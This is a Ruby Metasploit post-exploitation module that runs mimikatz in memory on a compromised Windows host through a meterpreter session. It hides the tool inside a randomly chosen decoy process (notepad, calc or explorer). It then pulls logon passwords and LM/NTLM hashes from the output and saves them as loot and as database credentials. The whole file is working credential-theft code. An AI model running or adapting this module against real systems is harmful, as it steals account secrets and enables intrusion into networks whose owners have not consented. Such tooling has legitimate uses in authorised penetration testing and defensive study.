require 'msf/core'

##
# Notes:
#  Requires mimikatz-x86.exe and/or mimikatz-x64.exe in mimikatz_bin_dir
#  Tested with: 
#   mimikatz 1.0 x86 (RC)  /* Traitement du Kiwi (Sep  8 2012 18:17:53) */ 
#   mimikatz 1.0 x64 (RC)  /* Traitement du Kiwi (Sep  8 2012 18:17:53) */
#  Older mimikatz versions will not work due to requirement for external files
#  x64 injection requires some patching and compilation, see github
#  Output parsing is likely to break as the author changes his formatting
##

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( 
      update_info( 
        info,
        'Name'          => 'Mimikatz In Mem',
        'Description'   => %q{ This module executes mimikatz in memory, with options for storing credentials to the DB and loot },
        'License'       => MSF_LICENSE,
        'Author'        => [ 
          'Matt Andreko "hostess"', # Original on-disk module:
          # https://github.com/mandreko/metasploit-framework/blob/mimikatz_post/modules/post/windows/gather/mimikatz.rb
          'RageLtMan <rageltman[at]sempervictus>' # InMem adaptation, output processing, data retention
          ],
        'Platform'      => [ 'windows' ],
        'SessionTypes'  => [ 'meterpreter' ],
        'References'    => [
                [ 'URL', 'http://blog.gentilkiwi.com/mimikatz' ]
        ],
        'DisclosureDate'=> "Dec 31, 2010"
    ))

    register_options([
     OptBool.new('SHOW_SYSTEM_USERS', [ false, 'Show the system users, which often have un-readable passwords.', false]),
     OptPath.new('MIMIKATZ_BIN_DIR',  [ 
      true, 
      'Directory where mimikatz binaries aer stored', 
      ::File.join(Msf::Config.install_root,'data','post')
      ]),
    ])

    register_advanced_options([
      OptBool.new('StoreCreds', [ true, 'Store found credentials to the DB', true]),
      OptBool.new('StoreLoot', [ true, 'Store found credentials to loot file', true]),
      ])

  end

  def run
    print_status("Running module against #{sysinfo['Computer']}")
    output = run_mimikatz
    process_mimikatz_passwords(output)
  end

  # Configures parameters for exec_in_mem, returns raw console output
  # TODO: automate certificate and key extraction
  def run_mimikatz(args = '"sekurlsa::logonPasswords full" exit')
    arch = sysinfo['Architecture'] == 'x86' ? 'x86' : 'x64'
    bin = ::File.join(datastore['MIMIKATZ_BIN_DIR'],"mimikatz-#{arch}.exe")
    output = exec_in_mem(bin,args)
    if datastore['StoreLoot']
      path = store_loot(
        "mimikatz.credentials",
        "text/plain",
        session,
        output,
        "mimikatz_credentials.txt",
        "Mimikatz Credentials"
      )
      vprint_good("Saved output to #{path}")
    end
    return output
  end

  # Make sense of raw text output 
  def process_mimikatz_passwords(output)
    # Find process out each enumerated session
    users = {}
    output.scan(/^(Authentification.*?)\r\n\r\n/m).flatten.each do |user|

      uname = user.scan(/\r\nUtilisateur principal\s+\:\s(.*)/).flatten.first.strip
      # Skip system users unless otherwise specified
      if is_system_user?(uname)
        next unless datastore['SHOW_SYSTEM_USERS']
      else
        uname = uname.downcase
      end
      users[uname] ||= {}

      # Get LM/NTLM hashes from msv1_0 output
      begin
        user.scan(/\n\tmsv1_0\s\:\s\t(.*?)kerb/m).flatten.first.scan(/\sHash\s(.*)/).flatten.each do |hash|
          type, val = hash.split(':').map(&:strip)
          # Add hash unless its empty
          users[uname][type] = val unless val == '00000000000000000000000000000000'
        end
      rescue => e
        vprint_error("Could not parse msv1_0 due to #{e}")
      end

      # Get password from kerberos
      begin
        kerb_pass = user.scan(/\n\tkerberos\s\:\s\t(.*?)wdigest/m).flatten.first.split(':').last.strip
        users[uname]['KerberosPassword'] = kerb_pass unless  kerb_pass.empty? or kerb_pass == 'n.t. (LUID KO)'
      rescue => e
        vprint_error("Could not parse kerberos password due to #{e}")
      end

      # Get password from wdigest
      begin
        wd_pass = user.scan(/\n\twdigest.*/m).first.split(':').last.strip
        users[uname]['WdigestPassword'] = wd_pass unless  wd_pass.empty? or wd_pass == 'n.t. (LUID KO)'
      rescue => e
        vprint_error("Could not parse wdigest password due to #{e}")
      end
          
    end # next user

    store_creds(users) if datastore['StoreCreds']
    return users
  end

  def store_creds(structured)
    structured.each do |user, creds|
      # Get password, report if we have one
      pass = creds['KerberosPassword'] || creds['WdigestPassword']
      if pass
        report_auth_info(
          :host  => session.sock.peerhost,
          :port  => 445,
          :sname => 'smb',
          :user  => user,
          :pass  => pass,
          :type  => "password"
        )
      end
      # Get hashes, clean up for consistency, and report
      hash = "#{creds['LM']}:#{creds['NTLM']}"
      if hash.length > 1 
        if hash.strip[0] == ':'
          hash = 'aad3b435b51404eeaad3b435b51404ee' + hash
        end
        report_auth_info(
          :host  => session.sock.peerhost,
          :port  => 445,
          :sname => 'smb',
          :user  => user,
          :pass  => hash,
          :type  => "smb_hash"
        )
      end
    end
    print_good("Saved passwords for #{structured.keys.join(" ")}")
  end

  # Execute in memory, passing arguments, an array of commands, and a dummy_bin
  # path to local binary to execute is the ony required argument
  def exec_in_mem(bin,args=nil,commands=nil,dummy_bin=nil)
    return unless bin
    dummies = %w{notepad.exe calc.exe explorer.exe}
    process = client.sys.process.execute(
      bin,
      args,
      'Channelized' => true,
      'Hidden' => true,
      'InMemory' => dummy_bin || dummies.sample
      )
    output =  get_cmd_output(process)

    # Run commands, get output
    if commands.is_a?(Array)
      commands.each do |command|
        next if command.nil? or command.strip.empty?
        process.channel.write(command + "\n")
        output << get_cmd_output(process)
      end
    end

    # Clean up
    process.channel.close
    process.close

    return output
  end

  # Reads command output, does not close channel
  def get_cmd_output(process)
    o = ""
    while (d = process.channel.read)
            break if d == ""
            o << d
    end 
    return o
  end

  # From Hostess' on-disk module
  def is_system_user?(user)
    system_users = [
      /^$/,
      /^ASPNET$/,
      /^ASP\.NET V2\.0 Integrated$/,
      /^ANONYMOUS LOGON$/, /^IUSR.*/,
      /^IWAM.*/,
      /^IIS_WPG$/,
      /.*\$$/,
      /^LOCAL SERVICE$/,
      /^NETWORK SERVICE$/,
      /^LOCAL SYSTEM$/
    ]

    return system_users.find{|r| user.match(r)}
  end
end

 
